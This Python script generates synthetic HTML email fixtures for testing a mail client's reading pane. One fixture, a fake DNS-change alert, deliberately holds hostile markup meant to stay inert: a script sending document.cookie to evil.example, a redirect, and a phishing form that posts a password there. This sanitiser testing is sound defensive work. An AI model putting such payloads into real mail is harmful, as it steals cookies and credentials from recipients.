"""Regenerates the HTML mail rendering fixtures: `python generate.py` (synthetic brands and data).

They mimic real-world layouts (nested tables, sized icons, inline CSS, cid: pictures, hostile
markup) so the reading pane can be checked against how a browser shows the same HTML.
"""

import base64
import os
import struct
import zlib

OUT = os.path.dirname(os.path.abspath(__file__))
CDN = "https://static.cdn.example.net"


def png(width, height, color, stripe=None):
    rows = b""
    for y in range(height):
        row = b"\x00"
        for x in range(width):
            striped = stripe and (x // 8) % 2 == 0 and y > height // 2
            row += bytes(stripe if striped else color)
        rows += row

    def chunk(kind, data):
        crc = zlib.crc32(kind + data) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", crc)

    header = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"IDAT", zlib.compress(rows))
        + chunk(b"IEND", b"")
    )


def b64(data):
    text = base64.b64encode(data).decode()
    return "\n".join(text[i : i + 76] for i in range(0, len(text), 76))


def eml(name, headers, body):
    with open(os.path.join(OUT, name), "w", newline="\r\n", encoding="utf-8") as file:
        file.write(headers.strip() + "\n\n" + body.lstrip("\n"))


def html_mail(name, sender, subject, date, html):
    eml(
        name,
        f"""
From: {sender}
To: Alex Martin <alex.martin@example.com>
Subject: {subject}
Date: {date}
Message-ID: <{name}@fixtures.mailbox.test>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="ALT"
""",
        f"""
--ALT
Content-Type: text/plain; charset=utf-8

(plain text version of {subject})

--ALT
Content-Type: text/html; charset=utf-8

{html}
--ALT--
""",
    )


# 1. Social network notification: nested tables, icons with width/height, tracking pixel.
html_mail(
    "01-social-notification.eml",
    "Socialbook <notification@socialbook.example>",
    "Sam Rivera commented on your photo",
    "Mon, 09 Nov 2026 08:12:00 +0100",
    f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
a.btn:hover {{ background:#166fe5; }}
</style></head>
<body style="margin:0;padding:0;background-color:#ffffff">
<table border="0" cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tr><td align="center" style="background-color:#ffffff">
 <table border="0" cellspacing="0" cellpadding="0" width="500" style="border-collapse:collapse;width:500px">
  <tr><td style="padding:16px 0;border-bottom:1px solid #e5e5e5">
   <table border="0" cellspacing="0" cellpadding="0"><tr>
    <td width="32" style="width:32px"><img src="{CDN}/sb/logo-32.png" width="32" height="32" alt="Socialbook" style="display:block;border:0"></td>
    <td style="padding-left:10px;font-family:Helvetica,Arial,sans-serif;font-size:19px;color:#1877f2;font-weight:bold">socialbook</td>
   </tr></table>
  </td></tr>
  <tr><td style="padding:20px 0 8px 0;font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Hi Alex,</td></tr>
  <tr><td style="padding:0 0 16px 0">
   <table border="0" cellspacing="0" cellpadding="0" width="100%"><tr>
    <td width="56" valign="top" style="width:56px"><img src="{CDN}/sb/avatar-sam.jpg" width="48" height="48" alt="" style="display:block;border-radius:24px;border:0"></td>
    <td valign="top" style="font-family:Helvetica,Arial,sans-serif;font-size:14px;line-height:19px;color:#141823">
      <span style="font-weight:bold;color:#141823">Sam Rivera</span> commented on your photo:
      <div style="margin-top:6px;padding:8px 12px;background-color:#f2f3f5;border-radius:16px;color:#1c1e21">Great shot! Where was this taken?</div>
      <div style="margin-top:6px;font-size:12px;color:#90949c"><img src="{CDN}/sb/icon-comment.png" width="12" height="12" alt="" style="vertical-align:middle"> 2 hours ago</div>
    </td>
   </tr></table>
  </td></tr>
  <tr><td style="padding:0 0 24px 0">
    <a class="btn" href="https://www.socialbook.example/photo/123?comment=456" style="display:inline-block;background-color:#1877f2;color:#ffffff;font-family:Helvetica,Arial,sans-serif;font-size:14px;font-weight:bold;text-decoration:none;padding:9px 18px;border-radius:6px">See comment</a>
    &nbsp;
    <a href="https://www.socialbook.example/reply/456" style="display:inline-block;background-color:#e4e6eb;color:#050505;font-family:Helvetica,Arial,sans-serif;font-size:14px;font-weight:bold;text-decoration:none;padding:9px 18px;border-radius:6px">Reply</a>
  </td></tr>
  <tr><td style="border-top:1px solid #e5e5e5;padding:14px 0;font-family:Helvetica,Arial,sans-serif;font-size:11px;line-height:16px;color:#8a8d91">
   This message was sent to alex.martin@example.com. If you don't want to receive these emails from Socialbook in the future, please <a href="https://www.socialbook.example/unsub" style="color:#385898;text-decoration:none">unsubscribe</a>.<br>
   Socialbook Inc., 1 Example Way, Springfield
  </td></tr>
 </table>
</td></tr></table>
<img src="https://track.socialbook.example/open.gif?u=abc" width="1" height="1" alt="" style="display:block">
</body></html>
""",
)

# 2. Account security alert: centred card, logo with width/height, rounded border, blue button.
html_mail(
    "02-security-alert.eml",
    "Accounts <no-reply@accounts.example.org>",
    "Security alert: new sign-in on Windows",
    "Tue, 10 Nov 2026 21:40:00 +0000",
    f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"></head>
<body style="margin:0;padding:0;background:#ffffff">
<table width="100%" style="min-width:348px" border="0" cellspacing="0" cellpadding="0" lang="en">
<tr height="32" style="height:32px"><td></td></tr>
<tr align="center"><td>
 <table border="0" cellspacing="0" cellpadding="0" style="padding-bottom:20px;max-width:516px;min-width:220px">
  <tr><td width="8" style="width:8px"></td><td>
   <div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center">
    <img src="{CDN}/acc/logo-74x24.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px" alt="Accounts">
    <div style="font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
     <div style="font-size:24px">A new sign-in on Windows</div>
     <table align="center" style="margin-top:8px"><tr style="line-height:normal">
      <td align="right" style="padding-right:8px"><img width="20" height="20" style="width:20px;height:20px;vertical-align:sub;border-radius:50%" src="{CDN}/acc/avatar-a.png" alt=""></td>
      <td><a style="font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px">alex.martin@example.com</a></td>
     </tr></table>
    </div>
    <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:left">
     We noticed a new sign-in to your account on a Windows device. If this was you, you don't need to do anything. If not, we'll help you secure your account.
     <div style="padding-top:32px;text-align:center"><a href="https://accounts.example.org/AccountChooser?continue=activity" target="_blank" style="font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px">Check activity</a></div>
    </div>
    <div style="padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">You can also see security activity at<br><a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://accounts.example.org/notifications</a></div>
   </div>
   <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
    <div>You received this email to let you know about important changes to your account and services.</div>
    <div style="direction:ltr">&copy; 2026 Example Accounts LLC, 100 Example Parkway, Mountain City</div>
   </div>
  </td><td width="8" style="width:8px"></td></tr>
 </table>
</td></tr>
<tr height="32" style="height:32px"><td></td></tr>
</table>
</body></html>
""",
)

# 3. Hosting provider invoice: bgcolor/cellpadding attributes, border="0", header band.
html_mail(
    "03-hosting-invoice.eml",
    "HostCloud Billing <billing@hostcloud.example>",
    "Your invoice FR-2026-11-0042 is available",
    "Wed, 11 Nov 2026 06:05:00 +0100",
    f"""<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body bgcolor="#f2f4f7" style="margin:0;padding:0">
<table width="100%" bgcolor="#f2f4f7" border="0" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding:24px 8px">
<table width="600" border="0" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border:1px solid #d9dee5">
 <tr><td bgcolor="#000e9c" style="padding:18px 24px"><img src="{CDN}/hc/logo-white-140x28.png" width="140" height="28" alt="HostCloud" style="display:block"></td></tr>
 <tr><td style="padding:28px 24px 8px 24px;font-family:Arial,sans-serif;font-size:20px;color:#000e9c;font-weight:bold">Your invoice is available</td></tr>
 <tr><td style="padding:0 24px 16px 24px;font-family:Arial,sans-serif;font-size:14px;line-height:22px;color:#4d5592">
   Hello Alex,<br>Your invoice <b>FR-2026-11-0042</b> for the period 01/11/2026 &ndash; 30/11/2026 is now available in your customer area. The amount will be debited from your registered payment method.
 </td></tr>
 <tr><td style="padding:0 24px">
  <table width="100%" border="0" cellpadding="8" cellspacing="0" style="font-family:Arial,sans-serif;font-size:13px;color:#333333;border-collapse:collapse">
   <tr bgcolor="#eef1f8"><th align="left" style="color:#000e9c">Service</th><th align="center" style="color:#000e9c">Qty</th><th align="right" style="color:#000e9c">Amount</th></tr>
   <tr><td style="border-bottom:1px solid #e5e8ee">VPS Value 2 vCores</td><td align="center" style="border-bottom:1px solid #e5e8ee">1</td><td align="right" style="border-bottom:1px solid #e5e8ee">6,00&nbsp;&euro;</td></tr>
   <tr><td style="border-bottom:1px solid #e5e8ee">Domain example-project.test (renewal)</td><td align="center" style="border-bottom:1px solid #e5e8ee">1</td><td align="right" style="border-bottom:1px solid #e5e8ee">9,99&nbsp;&euro;</td></tr>
   <tr><td style="border-bottom:1px solid #e5e8ee">Automated backup</td><td align="center" style="border-bottom:1px solid #e5e8ee">1</td><td align="right" style="border-bottom:1px solid #e5e8ee">1,20&nbsp;&euro;</td></tr>
   <tr><td colspan="2" align="right"><b>Total incl. VAT</b></td><td align="right" style="font-size:15px;color:#000e9c"><b>20,63&nbsp;&euro;</b></td></tr>
  </table>
 </td></tr>
 <tr><td align="center" style="padding:24px">
  <table border="0" cellpadding="0" cellspacing="0"><tr><td bgcolor="#000e9c" style="border-radius:4px">
   <a href="https://www.hostcloud.example/manager/billing/invoices/FR-2026-11-0042" style="display:inline-block;padding:12px 28px;font-family:Arial,sans-serif;font-size:14px;color:#ffffff;text-decoration:none;font-weight:bold">Download the invoice</a>
  </td></tr></table>
 </td></tr>
 <tr><td style="padding:16px 24px;background:#f7f8fb;border-top:1px solid #e5e8ee;font-family:Arial,sans-serif;font-size:11px;line-height:16px;color:#8c93b6">
  HostCloud SAS &middot; 2 rue de l'Exemple, 59100 Roubaix &middot; This is an automated message, please do not reply.
 </td></tr>
</table>
</td></tr></table>
</body></html>
""",
)

# 4. Marketing newsletter: 600px centred, background colours, buttons, cid: inline pictures.
LOGO = png(160, 48, (255, 98, 0), stripe=(255, 255, 255))
HERO = png(600, 200, (33, 37, 41), stripe=(255, 193, 7))
eml(
    "04-newsletter.eml",
    """
From: Northwind Outdoor <news@northwind-outdoor.example>
To: Alex Martin <alex.martin@example.com>
Subject: Winter sale: up to 40% off jackets
Date: Thu, 12 Nov 2026 10:00:00 +0100
Message-ID: <04-newsletter.eml@fixtures.mailbox.test>
MIME-Version: 1.0
Content-Type: multipart/related; boundary="REL"; type="text/html"
""",
    f"""
--REL
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html><head><meta charset="utf-8">
<style type="text/css">
 body {{ margin:0; padding:0; }}
 h1 {{ font-family: Georgia, 'Times New Roman', serif; font-size:30px; color:#212529; margin:0 0 12px 0; }}
 @media only screen and (max-width:620px) {{ .container {{ width:100% !important; }} .col {{ display:block !important; width:100% !important; }} }}
</style></head>
<body>
<div style="background-color:#eceff1;padding:24px 0">
<table class="container" role="presentation" width="600" align="center" cellpadding="0" cellspacing="0" border="0" style="width:600px;margin:0 auto;background-color:#ffffff">
 <tr><td style="background-color:#212529;padding:6px 24px;color:#adb5bd;font-family:Arial,sans-serif;font-size:11px;text-align:right">Having trouble reading this? <a href="https://northwind-outdoor.example/web/123" style="color:#ffc107">Online version</a></td></tr>
 <tr><td align="center" style="padding:24px 0 16px 0"><img src="cid:logo@northwind" width="160" height="48" alt="Northwind Outdoor" style="display:block;border:0"></td></tr>
 <tr><td><img src="cid:hero@northwind" width="600" height="200" alt="Winter sale" style="display:block;width:100%;max-width:600px;height:auto;border:0"></td></tr>
 <tr><td style="padding:32px 40px 8px 40px;text-align:center">
   <h1>Winter sale is on</h1>
   <p style="font-family:Arial,sans-serif;font-size:16px;line-height:24px;color:#495057;margin:0 0 24px 0">Stay warm for less: up to <strong style="color:#ff6200">40% off</strong> insulated jackets, fleeces and boots. Only until Sunday.</p>
   <a href="https://northwind-outdoor.example/sale?utm_source=newsletter" style="background:#ff6200;color:#ffffff;border-radius:24px;padding:14px 34px;text-decoration:none;font-weight:bold;display:inline-block;font-family:Arial,sans-serif;font-size:15px">Shop the sale</a>
 </td></tr>
 <tr><td style="padding:32px 24px">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr>
   <td class="col" width="50%" valign="top" style="padding:0 8px">
    <div style="background-color:#fff3e0;border-radius:8px;padding:20px;font-family:Arial,sans-serif">
     <div style="font-size:12px;color:#ff6200;font-weight:bold;letter-spacing:1px">JACKETS</div>
     <div style="font-size:18px;color:#212529;margin:6px 0">Alpine Down Parka</div>
     <div style="font-size:14px;color:#495057"><s style="color:#adb5bd">249 &euro;</s> <b>149 &euro;</b></div>
    </div>
   </td>
   <td class="col" width="50%" valign="top" style="padding:0 8px">
    <div style="background-color:#e3f2fd;border-radius:8px;padding:20px;font-family:Arial,sans-serif">
     <div style="font-size:12px;color:#1565c0;font-weight:bold;letter-spacing:1px">BOOTS</div>
     <div style="font-size:18px;color:#212529;margin:6px 0">Trail Winter Boot</div>
     <div style="font-size:14px;color:#495057"><s style="color:#adb5bd">139 &euro;</s> <b>99 &euro;</b></div>
    </div>
   </td>
  </tr></table>
 </td></tr>
 <tr><td style="background-color:#212529;padding:24px;text-align:center;font-family:Arial,sans-serif;font-size:12px;line-height:18px;color:#adb5bd">
  Northwind Outdoor &middot; 10 Example Street, Lyon<br>
  <a href="https://northwind-outdoor.example/unsubscribe" style="color:#ffc107">Unsubscribe</a> &middot; <a href="https://northwind-outdoor.example/prefs" style="color:#ffc107">Preferences</a>
 </td></tr>
</table>
</div>
<img src="https://open.northwind-outdoor.example/p.gif?id=xyz" width="1" height="1" alt="">
</body></html>

--REL
Content-Type: image/png; name="logo.png"
Content-ID: <logo@northwind>
Content-Disposition: inline; filename="logo.png"
Content-Transfer-Encoding: base64

{b64(LOGO)}
--REL
Content-Type: image/png; name="hero.png"
Content-ID: <hero@northwind>
Content-Disposition: inline; filename="hero.png"
Content-Transfer-Encoding: base64

{b64(HERO)}
--REL--
""",
)

# 5. CDN/DNS provider alert, with hostile markup that must stay inert (script, form, iframe...).
html_mail(
    "05-cdn-alert.eml",
    "EdgeShield <noreply@notify.edgeshield.example>",
    "[EdgeShield] DNS record changed on example-project.test",
    "Fri, 13 Nov 2026 14:22:00 +0000",
    f"""<html><head>
<script>document.title='pwned'; fetch('https://evil.example/steal?c='+document.cookie);</script>
<link rel="stylesheet" href="https://evil.example/track.css">
<meta http-equiv="refresh" content="0;url=https://evil.example/redirect">
</head>
<body style="margin:0;background:#f4f4f4">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f4f4"><tr><td align="center" style="padding:20px">
<table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:6px;overflow:hidden;font-family:-apple-system,'Segoe UI',Helvetica,Arial,sans-serif">
 <tr><td style="background:#f38020;height:6px;font-size:0;line-height:0">&nbsp;</td></tr>
 <tr><td style="padding:24px 32px 0 32px"><img src="{CDN}/es/logo-120x32.png" width="120" height="32" alt="EdgeShield"></td></tr>
 <tr><td style="padding:16px 32px;font-size:15px;line-height:22px;color:#313131">
  <p style="margin:0 0 12px 0">A DNS record was modified on <b>example-project.test</b>:</p>
  <table cellpadding="6" cellspacing="0" width="100%" style="border:1px solid #e2e2e2;font-family:Consolas,'Courier New',monospace;font-size:13px;background:#fafafa">
   <tr><td style="color:#888">Type</td><td>A</td></tr>
   <tr><td style="color:#888">Name</td><td>www</td></tr>
   <tr><td style="color:#888">Content</td><td>198.51.100.24</td></tr>
   <tr><td style="color:#888">Proxied</td><td style="color:#2c7cb0">Yes</td></tr>
  </table>
  <p style="margin:16px 0 0 0" onclick="alert(1)">If you did not make this change, <a href="https://dash.edgeshield.example/audit-log" style="color:#2c7cb0">review the audit log</a> immediately.</p>
  <form action="https://evil.example/collect" method="post"><input name="password" type="password" placeholder="Confirm password"> <button type="submit">Confirm</button></form>
  <div style="background-image:url(https://evil.example/bg-tracker.png);height:4px"></div>
 </td></tr>
 <tr><td style="padding:16px 32px 24px 32px;font-size:12px;color:#888;border-top:1px solid #eee">EdgeShield, Inc. &middot; 101 Example Street, San Francisco</td></tr>
</table>
</td></tr></table>
<iframe src="https://evil.example/frame" width="1" height="1"></iframe>
</body></html>
""",
)

# 7. Only CSS background pictures (<style>, style attribute, background attribute): the
# "Pictures were blocked" bar must still show, and the layout keep its colours.
html_mail(
    "07-css-backgrounds.eml",
    "Lumen Events <hello@lumen-events.example>",
    "Your ticket for Lumen Night 2026",
    "Sun, 08 Nov 2026 18:00:00 +0100",
    f"""<!DOCTYPE html><html><head><meta charset="utf-8"><style>
 .hero {{ background: #1b1f3b url("{CDN}/le/hero-stars.jpg") center / cover no-repeat; }}
 .ticket {{ background-image: url('{CDN}/le/ticket-pattern.png'); }}
</style></head>
<body style="margin:0;background:#f5f3ff">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f5f3ff"><tr><td align="center" style="padding:24px">
<table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:12px;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif">
 <tr><td class="hero" height="180" style="height:180px;padding:32px;color:#ffffff;vertical-align:bottom">
  <div style="font-size:13px;letter-spacing:2px;color:#c4b5fd">LUMEN NIGHT 2026</div>
  <div style="font-size:28px;font-weight:600">Your ticket is confirmed</div>
 </td></tr>
 <tr><td class="ticket" style="padding:24px 32px;background-color:#ede9fe">
  <table width="100%" cellpadding="0" cellspacing="0" style="font-size:14px;color:#3b0764">
   <tr><td style="padding:4px 0;color:#6d28d9">Date</td><td align="right">Sat 21 Nov 2026, 20:00</td></tr>
   <tr><td style="padding:4px 0;color:#6d28d9">Venue</td><td align="right">Hall 3, Example Expo</td></tr>
   <tr><td style="padding:4px 0;color:#6d28d9">Seat</td><td align="right"><b>Floor, standing</b></td></tr>
  </table>
 </td></tr>
 <tr><td background="{CDN}/le/divider.png" style="height:8px;font-size:0;line-height:0;background-color:#c4b5fd">&nbsp;</td></tr>
 <tr><td align="center" style="padding:28px 32px">
  <a href="https://lumen-events.example/tickets/LN-2026-0091" style="display:inline-block;padding:12px 30px;border-radius:8px;background:#6d28d9;color:#ffffff;text-decoration:none;font-weight:600">Open my ticket</a>
 </td></tr>
 <tr><td style="padding:16px 32px;font-size:11px;color:#7c7c99;background:#faf9ff">Lumen Events &middot; 5 Example Square, Lille</td></tr>
</table>
</td></tr></table>
</body></html>
""",
)

# 6. Plain text: stays in the app theme.
eml(
    "06-plain-text.eml",
    """
From: Jordan Lee <jordan.lee@example.com>
To: Alex Martin <alex.martin@example.com>
Subject: Notes from Thursday's call
Date: Sat, 14 Nov 2026 09:30:00 +0100
Message-ID: <06-plain-text.eml@fixtures.mailbox.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
""",
    """
Hi Alex,

Quick recap of Thursday's call:

- Launch moves to December 3rd.
- Sam owns the migration checklist: https://wiki.example.com/projects/migration
- Next sync: Tuesday 10:00.

> Can we keep the old export format for one more release?
Yes, until 2.4.

Thanks,
Jordan
""",
)
